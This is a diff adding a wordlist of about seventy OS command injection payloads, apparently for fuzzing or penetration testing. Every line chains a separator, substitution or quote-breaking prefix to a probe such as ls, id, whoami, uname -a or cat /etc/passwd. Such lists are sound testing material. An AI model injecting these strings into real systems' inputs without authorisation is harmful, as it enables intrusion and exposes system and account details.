@@ -1,0 +1,71 @@
+;ls
+;id
+;whoami
+;cat /etc/passwd
+;uname -a
+|ls
+|id
+|whoami
+|cat /etc/passwd
+|uname -a
+`ls`
+`id`
+`whoami`
+`cat /etc/passwd`
+$(ls)
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+&ls
+&id
+&whoami
+&&ls
+&&id
+&&whoami
+;ls;
+|ls|
+`ls`
+$(ls)
+%0als
+%0aid
+%0awhoami
+;ls%0a
+|ls%0a
+;ls%20
+|ls%20
+;$(ls)
+|(ls)
+;`ls`
+|`ls`
+;ls||
+|ls||
+;ls&&
+|ls&&
+' && ls
+' || ls
+' & ls
+" && ls
+" || ls
+" & ls
+'; ls
+'| ls
+'` ls
+'; ls;
+'| ls|
+'` ls`
+"; ls
+"| ls
+"` ls
+"; ls;
+"| ls|
+"` ls`
+a);ls
+a);id
+a);whoami
+a|ls
+a|id
+a|whoami
+a`ls`
+a`id`
+a$(ls)
+a$(id)
